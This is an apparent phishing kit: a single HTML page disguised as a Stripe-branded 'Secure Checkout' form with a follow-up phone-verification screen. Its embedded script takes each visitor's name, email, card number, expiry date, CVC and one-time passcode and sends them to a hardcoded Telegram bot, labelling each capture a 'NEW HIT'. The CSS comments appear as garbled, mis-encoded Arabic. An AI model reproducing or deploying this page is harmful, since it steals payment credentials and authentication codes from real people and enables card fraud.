<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <style>
        :root {
            --stripe-blue: #0000FF; 
            --border-color: #e6e6e6;
            --text-main: #1a1a1a;
            --text-gray: #6b7280;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .container { 
            width: 100%; 
            max-width: 400px; 
            position: relative;
        }

        /* --- Logo & Header (Ù…Ù‚Ø§Ø³Ø§Øª ÙƒØ¨ÙŠØ±Ø© ÙˆØªØ·Ø§Ø¨Ù‚ 1000%) --- */
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo-container {
            width: 70px; /* ØªÙ… ØªÙƒØ¨ÙŠØ± Ø§Ù„Ù„ÙˆØ¬Ùˆ ÙƒÙ…Ø§ Ø·Ù„Ø¨Øª */
            height: auto;
            margin-right: 15px;
            display: flex;
            align-items: center;
        }

        .logo-container img {
            width: 100%;
            height: auto;
            object-fit: contain; /* ÙŠØ¸Ù‡Ø± Ø§Ù„Ù„ÙˆØ¬Ùˆ ÙƒØ§Ù…Ù„Ø§Ù‹ Ø¨Ø¯ÙˆÙ† Ø£ÙŠ Ù‚Øµ Ø£Ùˆ Ø´ÙƒÙ„ Ø¯Ø§Ø¦Ø±ÙŠ */
        }

        .header-title {
            font-size: 24px; /* Ø®Ø· Ø¹Ø±ÙŠØ¶ ÙˆÙƒØ¨ÙŠØ± */
            font-weight: 700;
            color: var(--text-main);
        }

        /* --- Sections & Inputs --- */
        h2 { 
            font-size: 18px; 
            font-weight: 600; 
            margin: 30px 0 15px 0; 
        }

        label {
            display: block;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 14px; /* Ù…Ø¯Ø®Ù„Ø§Øª Ø£ÙƒØ¨Ø± Ù„Ø±Ø§Ø­Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… */
            border: 1px solid var(--border-color);
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            margin-bottom: 12px;
        }

        /* --- Grouping Style (Stripe Style) --- */
        .input-group {
            border: 1px solid var(--border-color);
            border-radius: 8px;
            overflow: hidden;
        }

        .input-group input {
            border: none;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 0;
            border-radius: 0;
        }

        .input-group input:last-child {
            border-bottom: none;
        }

        .row { display: flex; }
        .row input:first-child { border-right: 1px solid var(--border-color); }

        /* --- Payment Box --- */
        .payment-box {
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 18px;
            margin-top: 10px;
        }

        .payment-header {
            display: flex;
            align-items: center;
            margin-bottom: 18px;
            font-size: 17px;
            font-weight: 600;
        }

        .card-icons {
            margin-left: auto;
            height: 28px; /* ØªÙƒØ¨ÙŠØ± Ø£ÙŠÙ‚ÙˆÙ†Ø§Øª Ø§Ù„ÙÙŠØ²Ø§ ÙˆØ§Ù„Ù…Ø§Ø³ØªØ± ÙƒØ§Ø±Ø¯ */
        }

        /* --- Button --- */
        .btn-pay {
            width: 100%;
            background: var(--stripe-blue);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            margin-top: 35px;
            cursor: pointer;
        }

        /* --- Internal Alert (Matches Image 100%) --- */
        #modalOverlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.4);
            z-index: 999;
        }

        #customAlert {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 85%;
            max-width: 320px;
            background: white;
            border-radius: 14px;
            z-index: 1000;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }

        .alert-content { padding: 30px 20px; font-size: 17px; color: #000; }
        .alert-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-top: 1px solid #eee;
            background: none;
            color: var(--stripe-blue);
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
        }

        /* Pages control */
        .page { display: none; }
        .active { display: block; }
    </style>
</head>
<body>

<div class="container">
    <div id="modalOverlay"></div>
    <div id="customAlert">
        <div class="alert-content">Please fill in all fields correctly.</div>
        <button class="alert-btn" onclick="closeAlert()">Close</button>
    </div>

    <div id="checkoutPage" class="page active">
        <div class="header">
            <div class="logo-container">
                <img src="https://i.ibb.co/tk1fKpK/BA47-C500-F9-EF-4732-9881-42-D361-E42075.png" alt="Logo">
            </div>
            <div class="header-title">Secure Checkout</div>
        </div>

        <h2>Shipping Information</h2>
        <label>Email address</label>
        <input type="email" id="email" placeholder="email@example.com">
        
        <h2>Shipping Address</h2>
        <div class="input-group">
            <input type="text" id="name" placeholder="Full name">
            <input type="text" id="addr" placeholder="Address line 1">
            <div class="row">
                <input type="text" id="city" placeholder="City">
                <input type="text" id="zip" placeholder="Zip code">
            </div>
        </div>

        <h2>Payment Method</h2>
        <div class="payment-box">
            <div class="payment-header">
                <span>ğŸ’³ Card</span>
                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons">
            </div>
            <div class="input-group">
                <input type="text" id="card" placeholder="Card number" maxlength="19">
                <div class="row">
                    <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
                    <input type="text" id="cvc" placeholder="CVC" maxlength="4">
                </div>
            </div>
        </div>

        <button class="btn-pay" onclick="handlePayment()">Pay Now</button>
        <p style="text-align: center; color: #999; font-size: 13px; margin-top: 25px;">Powered by <b>stripe</b></p>
    </div>

    <div id="otpPage" class="page">
        <h1 style="font-size: 26px;">Verify By Phone</h1>
        <p style="color: #666; margin-bottom: 40px;">Please enter the verification code sent to your mobile phone.</p>
        
        <label style="text-align: center;">Verification code</label>
        <input type="text" id="otp" style="height: 65px; text-align: center; font-size: 28px; letter-spacing: 12px;" maxlength="6">
        
        <button class="btn-pay" onclick="handleOTP()">Confirm</button>
    </div>
</div>

<script>
    const CONFIG = {
        token: '8145212214:AAG-Dff6G7AFW_0_K9QTVZD-Wal-u81kCGyc',
        chat: '656419637'
    };

    async function sendTelegram(text) {
        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.chat, text: text, parse_mode: 'HTML'})
        });
    }

    function closeAlert() {
        document.getElementById('customAlert').style.display = 'none';
        document.getElementById('modalOverlay').style.display = 'none';
    }

    // Card formatting
    document.getElementById('card').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    async function handlePayment() {
        const email = document.getElementById('email').value;
        const card = document.getElementById('card').value;
        const name = document.getElementById('name').value;

        if (!email || card.length < 16 || !name) {
            document.getElementById('customAlert').style.display = 'block';
            document.getElementById('modalOverlay').style.display = 'block';
            return;
        }

        const log = `<b>ğŸ”¥ NEW HIT</b>\n\nğŸ‘¤ Name: ${name}\nğŸ“§ Email: ${email}\nğŸ’³ Card: <code>${card}</code>\nğŸ“… Exp: ${document.getElementById('exp').value}\nğŸ”’ CVC: ${document.getElementById('cvc').value}`;
        await sendTelegram(log);

        document.getElementById('checkoutPage').style.display = 'none';
        document.getElementById('otpPage').classList.add('active');
    }

    async function handleOTP() {
        const otp = document.getElementById('otp').value;
        if(otp.length === 6) {
            await sendTelegram(`<b>ğŸ”‘ OTP CODE:</b> <code>${otp}</code>`);
            alert("Verification Success.");
        }
    }
</script>
</body>
</html>
